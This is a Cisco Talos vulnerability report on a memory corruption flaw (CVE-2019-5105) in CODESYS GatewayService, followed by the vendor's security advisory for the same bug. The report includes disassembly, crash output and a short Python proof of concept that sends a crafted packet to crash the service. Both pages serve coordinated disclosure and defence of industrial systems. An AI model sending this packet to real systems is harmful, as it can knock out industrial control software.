=== Content from talosintelligence.com_a580a8b1_20250120_232108.html ===


* [Cisco Login](/users/auth/saml)

* [Intelligence Center](/reputation)

  + [# Intelligence Center](/reputation)
  + BACK
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* [Vulnerability Research](/vulnerability_info)

  + [# Vulnerability Research](/vulnerability_info)
  + BACK
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* [Incident Response](/incident_response)

  + [# Incident Response](/incident_response)
  + BACK
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* [Blog](https://blog.talosintelligence.com)
* [Support](https://support.talosintelligence.com)

More

* Security Resources

  # Security Resources

  + BACK
  Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* Media

  # Media

  + BACK
  Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* Company

  # Company

  + BACK
  Company
  + [About Talos](/about)
  + [Careers](/careers)

* Under Attack?
* [Cisco Login](/users/auth/saml)

## Contact Cisco Talos Incident Response

×

Close

This form is for Incident Response service inquiries only, including emergency network security needs.

For reputation or categorization inquiries, visit the [Talos Support site](/support).
For emergency DDoS mitigation assistance, please contact the [Cisco Secure DDoS Protection Team](https://www.cisco.com/c/en/us/products/collateral/security/ddos-emergency-attack-mitigation-aag.pdf).

Name

Company (optional)

Email address

Phone number

Preferred communication:

Email

Phone

What Incident Response Service are you interested in?
General Talos IR services and retainer information
Emergency Response
IR Plan
IR Playbooks
IR Readiness Assessment
Tabletop Exercises
Compromise Assessment
Threat Hunting
Cyber Range Training
Intelligence on Demand

Please provide as much detail as possible so we can best address your needs

I acknowledge that this is an inquiry for Incident Response services and that any other use of this form will not receive a response.

Send Email
Cancel

# Talos Vulnerability Report

### TALOS-2019-0897

## 3S-Smart Software Solutions CODESYS GatewayService memory corruption vulnerability

##### March 25, 2020

##### CVE Number

CVE-2019-5105

### Summary

An exploitable memory corruption vulnerability exists in the Name Service Client functionality of 3S-Smart Software Solutions CODESYS GatewayService. A specially crafted packet can cause a large memcpy, resulting in an access violation and termination of the process. An attacker can send a packet to a device running the GatewayService.exe to trigger this vulnerability. All variants of the CODESYS V3 products in all versions prior V3.5.16.10 containing the CmpRouter or CmpRouterEmbedded component are affected, regardless of the CPU type or operating system: CODESYS Control for BeagleBone, CODESYS Control for emPC-A/iMX6, CODESYS Control for IOT2000, CODESYS Control for Linux, CODESYS Control for PLCnext, CODESYS Control for PFC100, CODESYS Control for PFC200, CODESYS Control for Raspberry Pi, CODESYS Control RTE V3, CODESYS Control RTE V3 (for Beckhoff CX), CODESYS Control Win V3 (also part of the CODESYS Development System setup), CODESYS Control V3 Runtime System Toolkit, CODESYS V3 Embedded Target Visu Toolkit, CODESYS V3 Remote Target Visu Toolkit, CODESYS V3 Safety SIL2, CODESYS Edge Gateway V3, CODESYS Gateway V3, CODESYS HMI V3, CODESYS OPC Server V3, CODESYS PLCHandler SDK, CODESYS V3 Simulation Runtime (part of the CODESYS Development System).

### Tested Versions

3S-Smart Software Solutions CODESYS 3.5.15.0

### Product URLs

<https://www.codesys.com>

### CVSSv3 Score

7.5 - CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

### CWE

CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer

### Details

3S-Smart Software Solutions CODESYS is licensed to vendors who are creating PLCs, or can be purchased directly from 3S-Smart Software Solutions for directly supported platforms. This software is used to turn any device into a soft PLC. The wide range of support allows easy adoption for industrial applications, being able to run on Windows, Linux, or even bare metal. The GatewayService.exe is required to be able to talk to the end device such as a PLC, and will be running on any Windows device that is being used to program or monitor a CODESYS runtime.

This bug manifests itself within `RouterHandleData`, starting with the `RouterGetBlkAddresses` function. This function extracts values from the received packet from the lowest 3 bits of byte 1, as well as the nibbles in byte 5. These offsets are calculated with a zero-indexed notation where 0xC5 is considered byte 0. These values are not verified to be less than the total length of the packet, and because they are not checked prior to usage within the `memcpy` it allows for the possibility of a integer underflow directly into the `size` parameter of `memcpy`.

```
// -------------
// This is within RouterGetBlkAddresses where the information is extracted from the received packet
00439e28  8b4510             mov     eax, dword [ebp+0x10 {arg3}]
00439e2b  8b4808             mov     ecx, dword [eax+0x8]
00439e2e  8b5514             mov     edx, dword [ebp+0x14 {arg4}]
00439e31  034a08             add     ecx, dword [edx+0x8]
00439e34  8b45f8             mov     eax, dword [ebp-0x8 {byte1LowerThreeBitsSHL1}]
// ALL byte values are calculated using a zero-indexed notation where byte 0 is the magic 0xC5 header.
// ((Byte 1 lower 3 bits * 2) + (Upper nibble of byte 5 + lower nibble of byte
// 5)) * 2
00439e37  8d0c48             lea     ecx, [eax+ecx*2]
00439e3a  8b5518             mov     edx, dword [ebp+0x18 {arg5}]
// Store the calculated value
00439e3d  890a               mov     dword [edx], ecx
// -------------

// -------------
// BUG FIRST MANIFESTS HERE
0043b441  8b4d08             mov     ecx, dword [ebp+0x8 {arg3}]
0043b444  8b551c             mov     edx, dword [ebp+0x1c {arg8}]
0043b447  8b4104             mov     eax, dword [ecx+0x4]
0043b44a  2b02               sub     eax, dword [edx]
0043b44c  8985c8fdffff       mov     dword [ebp-0x238 {var_23c_1}], eax
// END BUG
// -------------

// -------------
// UNDERFLOW IS PLACED INTO MEMCPY SIZE UNCHECKED
0043b7ec  8b8dc8fdffff       mov     ecx, dword [ebp-0x238 {var_23c_1}]
0043b7f2  51                 push    ecx {var_278_6}
0043b7f3  8b5508             mov     edx, dword [ebp+0x8 {arg3}]
0043b7f6  8b02               mov     eax, dword [edx]
0043b7f8  8b4d1c             mov     ecx, dword [ebp+0x1c {arg8}]
0043b7fb  0301               add     eax, dword [ecx]
// HEAP ADDRESS SOURCE
0043b7fd  50                 push    eax {var_27c_9}
0043b7fe  8b95f8fdffff       mov     edx, dword [ebp-0x208 {var_20c_1}]
0043b804  8d8415fcfdffff     lea     eax, [ebp+edx-0x204] {__saved_ebp}
0043b80b  0385e4fdffff       add     eax, dword [ebp-0x21c {var_220_2}]
0043b811  0385c0fdffff       add     eax, dword [ebp-0x240 {var_244_2}]
0043b817  0385f0fdffff       add     eax, dword [ebp-0x210 {var_214}]
// STACK ADDRESS DESTINATION
0043b81d  50                 push    eax {var_280_9}
// CRASHING MEMCPY
0043b81e  e8c7860300         call    memcpy
// -------------

```
### Crash Information

```
(2ae0.2a3c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
DBGHELP: C:\Program Files (x86)\WAGO Software\e!COCKPIT\3S CODESYS\GatewayPLC\GatewayService.pdb - file not found
DBGHELP: E:\jenkins\workspace\3.5.13.x\BUILD_V3.5.13.x_RTS_Win_x86\CodesysSpV3\CodesysSpV3\Platforms\Windows\GatewayService\Release\Win32\GatewayService\GatewayService.pdb - file not found
DBGHELP: GatewayService - no symbols loaded
eax=0ab34c15 ebx=011f78f0 ecx=fffffc15 edx=fffffffd esi=0ab35000 edi=087efb60
eip=750ecf5e esp=087ef6c4 ebp=087ef94c iopl=0         nv up ei ng nz na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
VCRUNTIME140!memcpy+0x4e:
750ecf5e f3a4            rep movs byte ptr es:[edi],byte ptr [esi]

```
### Exploit Proof of Concept

Ensure that the target host and port are correctly filled out. Additionally if testing remotely, ensure that a firewall is not blocking traffic to the port specified. This can be exploited remotely as well as locally. All bytes that are capitalized within the packet are unrelated to the crash.

```
import socket
from struct import pack

HOST = '192.168.1.10'
PORT = 11743

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    crash = bytearray.fromhex("000117e839000000c5b3AAAAAAbcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")

    s.sendall(crash)

    s.close()

if __name__ == "__main__":
    main()

```
### Timeline

2019-09-19 - Initial Contact

2019-09-23 - Vendor Disclosure

2020-03-25 - Vendor Patched; Public Release

##### Credit

Discovered by Carl Hurd of Cisco Talos.

---

[Vulnerability Reports](/vulnerability_reports) [Next Report

TALOS-2020-1039](/vulnerability_reports/TALOS-2020-1039) [Previous Report

TALOS-2019-0874](/vulnerability_reports/TALOS-2019-0874)

* + ###### [Intelligence Center](/reputation)
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* + ###### [Vulnerability Research](/vulnerability_info)
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* + ###### [Incident Response](/incident_response)
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* + ###### Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* + ###### Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* + ###### Support
  + [Support Documentation](https://support.talosintelligence.com)
* + ###### Company
  + [About Talos](/about)
  + [Careers](/careers)
  + [Cisco Security](https://www.cisco.com/c/en/us/products/security/product-listing.html)

###### Follow us

[![Cisco](/assets/logo_cisco_white-d87b7f7d3152ad412e48aad924a972cc5b802b7a53cb56b0792a4456c9b7b3a5.svg)](http://tools.cisco.com/security/center/home.x)

©
2025
Cisco Systems, Inc. and/or its affiliates. All rights
reserved. View our
[Privacy Policy.](http://www.cisco.com/web/siteassets/legal/privacy_full.html)



=== Content from customers.codesys.com_c4b5cc6b_20250120_232106.html ===
Advisory 2020-02
Security update for various CODESYS V3 products using the CODESYS
communication protocol

Published: 22 July 2020

© CODESYS Group

Version: 6.0
Template: templ_tecdoc_en_V3.0.docx
File name: Advisory2020-02_CDS-69663.docx

CONTENT

1

2

2.1
2.2
2.3
2.4

3

3.1
3.2
3.3
3.4

4

5

6

7

8

Affected Products

Vulnerability overview

Type
Management Summary
References
Severity Rating

Vulnerability details

Detailed Description
Exploitability
Difficulty
Existence of exploit

Available software updates

Mitigation

Acknowledgments

Further Information

Disclaimer

Bibliography

Change History

Page

3

3

3
3
3
3

3

3
4
4
4

4

4

4

4

5

5

5


x
c
o
d
.
0
.
3
V
_
n
e
_
c
o
d
c
e
t
_
p
m
e
t

l

l

:
e
t
a
p
m
e
T

© CODESYS Group

3/5

Advisory 2020-02

1  Affected Products

All variants of the following CODESYS V3 products in all versions prior V3.5.16.10 containing the CmpRouter or
CmpRouterEmbedded component are affected, regardless of the CPU type or operating system:
• CODESYS Control for BeagleBone
• CODESYS Control for emPC-A/iMX6
• CODESYS Control for IOT2000
• CODESYS Control for Linux
• CODESYS Control for Linux ARM
• CODESYS Control for PLCnext
• CODESYS Control for PFC100
• CODESYS Control for PFC200
• CODESYS Control for Raspberry Pi
• CODESYS Control for WAGO Touch Panels 600
• CODESYS Control RTE V3
• CODESYS Control RTE V3 (for Beckhoff CX)
• CODESYS Control Win V3 (also part of the CODESYS Development System setup)
• CODESYS Control V3 Runtime System Toolkit
• CODESYS V3 Embedded Target Visu Toolkit
• CODESYS V3 Remote Target Visu Toolkit
• CODESYS V3 Safety SIL2
• CODESYS Edge Gateway V3
• CODESYS Gateway V3
• CODESYS HMI V3
• CODESYS OPC Server V3
• CODESYS PLCHandler SDK
• CODESYS V3 Simulation Runtime (part of the CODESYS Development System)


x
c
o
d
.
0
.
3
V
_
n
e
_
c
o
d
c
e
t
_
p
m
e
t

l

l

:
e
t
a
p
m
e
T

2  Vulnerability overview

2.1  Type

CWE-125: Out-of-bounds Read [7]

2.2  Management Summary

Crafted communication packets can trigger an out-of-bounds memory buffer access in the communication stack,
which may result in a denial-of-service condition.

2.3  References

CVE: CVE-2019-5105 [6]

CODESYS JIRA: CDS-69663, CDS-69665, CDS-69698, CDS-69876, CDS-71310, CDS-71393

2.4  Severity Rating

CODESYS GmbH has rated this vulnerability as high.

The CVSS v3.0 base score of 7.5 has been assigned. The CVSS vector string is
(CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H). [8]

3  Vulnerability details

3.1  Detailed Description

CODESYS products support a routing protocol for the communication between clients (CODESYS Development
System, OPC Server, PLCHandler, Remote Target Visu, etc.) and the CODESYS Control runtime system.
Crafted communication packets can trigger an out-of-bounds memory buffer access in the communication stack,
which may result in a denial-of-service condition.

© CODESYS Group

4/5

Advisory 2020-02

3.2  Exploitability

This vulnerability could be exploited remotely.

3.3  Difficulty

An attacker with low skills would be able to exploit this vulnerability.

3.4  Existence of exploit

POC is publicly available.

4  Available software updates

CODESYS GmbH has released version V3.5.16.10 to solve the noted vulnerability issue for all affected
CODESYS products.

Please visit the CODESYS update area for more information on how to obtain the software update [3].

It turned out that the previous fix in version V3.5.15.40 was incomplete. Therefore, we recommend an update to
V3.5.16.10 to close the vulnerability, regardless of the version used so far.

5  Mitigation

CODESYS GmbH recommends using the available software update to fix the vulnerability.

Currently, CODESYS GmbH has not identified any specific workarounds for this vulnerability, in case the
software update is not applied.

As part of a security strategy, CODESYS GmbH recommends the following general defense measures to
reduce the risk of exploits:
• Use controllers and devices only in a protected environment to minimize network exposure and ensure that
they are not accessible from outside
• Use firewalls to protect and separate the control system network from other networks
• Use VPN (Virtual Private Networks) tunnels if remote access is required
• Activate and apply user management and password features
• Limit the access to both development and control system by physical means, operating system features, etc.
• Protect both development and control system by using up to date virus detecting solutions
For more information and general recommendations for protecting machines and plants, see also the
CODESYS Security Whitepaper [1].

6  Acknowledgments

CODESYS GmbH thanks those in the security community, who help us to improve our products and to protect
customers and users through coordinated vulnerability disclosure.

We thank Carl Hurd of Cisco Talos, Gao Jian of NSFOCUS and an OEM customer for reporting this vulnerability
independently of each other following coordinated disclosure.

7  Further Information

For additional information regarding the CODESYS products, especially the above-mentioned versions, or about
the described vulnerability please contact the CODESYS support team [5].


x
c
o
d
.
0
.
3
V
_
n
e
_
c
o
d
c
e
t
_
p
m
e
t

l

l

:
e
t
a
p
m
e
T

© CODESYS Group

5/5

Advisory 2020-02

8  Disclaimer

CODESYS GmbH assumes no liability whatsoever for indirect, collateral, accidental or consequential losses
that occur by the distribution and/or use of this document or any losses in connection with the distribution and/or
use of this document. All information published in this document is provided on good faith by CODESYS GmbH.
Insofar as permissible by law, however, none of this information shall establish any guarantee, commitment or
liability on the part of CODESYS GmbH.

Note: Not all CODESYS features are available in all territories. For more information on geographic restrictions,
please contact sales@codesys.com.

Bibliography

[1]  CODESYS GmbH: CODESYS Security Whitepaper
[2]  CODESYS GmbH: Coordinated Disclosure Policy
[3]  CODESYS GmbH update area: https://www.codesys.com/download
[4]  CODESYS GmbH security information page: https://www.codesys.com/security
[5]  CODESYS GmbH support contact site: https://www.codesys.com/support
[6]  Common Vulnerabilities and Exposures (CVE): https://cve.mitre.org
[7]  Common Weakness Enumeration (CWE): https://cwe.mitre.org
[8]  CVSS Calculator: https://www.first.org/cvss/calculator/3.0
[9]  ICS-CERT: https://ics-cert.us-cert.gov

The latest version of this document can be found here:

https://customers.codesys.com/index.php?eID=dumpFile&t=f&f=13077&token=3bfc6d1d08415a6260b9609352
0071f5786e7fd4&download=


x
c
o
d
.
0
.
3
V
_
n
e
_
c
o
d
c
e
t
_
p
m
e
t

l

l

:
e
t
a
p
m
e
T

Change History

Version  Description

1.0

2.0

3.0

4.0

5.0

6.0

First version

Affected version corrected

Software update available

Public POC known

Complete revision of the document: Fix for V3.5.15.40 was incomplete, switched
to new style sheet
Software update available

Date

10.03.2020

11.03.2020

25.03.2020

01.04.2020

14.07.2020

22.07.2020

© CODESYS Group


